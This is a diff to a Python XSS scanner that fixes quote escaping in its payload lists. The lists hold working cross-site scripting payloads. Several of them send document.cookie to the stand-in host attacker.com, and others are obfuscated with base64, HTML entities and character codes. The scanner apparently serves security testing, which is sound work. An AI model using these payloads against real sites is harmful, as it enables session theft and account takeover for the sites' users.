@@ -86,7 +86,7 @@ class XSSScanner:
             '<script>navigator.sendBeacon("http://attacker.com/",document.cookie)</script>',
             '<script>new Image().src="http://attacker.com/?c="+document.cookie</script>',
             '<svg/onload=fetch("http://attacker.com/?c="+document.cookie)>',
-            '<img src=x onerror="eval(atob(\\'YWxlcnQoJ3hzcycp\\'))">',
+            '<img src=x onerror="eval(atob(\'YWxlcnQoJ3hzcycp\'))">',
         ],
         
         'stored_xss': [
@@ -122,7 +122,7 @@ class XSSScanner:
             '" ondblclick="alert("XSS")"',
             "' ondblclick='alert(\"XSS\")'",
             '" onkeydown="alert("XSS")"',
-            "' onkeydown='alert(\"XSS\")"',
+            "' onkeydown='alert(\"XSS\")'",
             '" onkeypress="alert("XSS")"',
             "' onkeypress='alert(\"XSS\")'",
             '" onkeyup="alert("XSS")"',
@@ -180,7 +180,7 @@ class XSSScanner:
             '<script>eval(atob("YWxlcnQoIlhTUyIp"))</script>',
             '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">',
             '<svg onload="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">',
-            '<body onload="eval(atob(\\'YWxlcnQoJ3hzcycp\\'))">',
+            '<body onload="eval(atob(\'YWxlcnQoJ3hzcycp\'))">',
             '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
             '<scr\x00ipt>alert("XSS")</scr\x00ipt>',
             '<script>alarm(1)</script>',
